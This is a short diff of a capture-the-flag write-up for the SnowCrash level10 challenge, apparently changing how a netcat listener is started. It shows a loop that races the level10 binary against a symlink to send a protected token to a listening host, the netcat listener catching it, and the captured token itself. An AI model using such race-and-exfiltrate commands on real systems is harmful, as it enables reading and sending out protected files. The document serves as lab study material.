@@ -65,7 +65,7 @@ level10@SnowCrash:~$ while true; do ./level10 /tmp/symlink {VM_IP}; done
 ```
 Then when we listen, sometimes its garbage, but sometimes we read the token!
 ```
-level10@SnowCrash:~$ nc -lk 6969
+level10@SnowCrash:~$ nc 6969 -l
 woupa2yuojeeaaed06riuj63c
 ```
 Great!
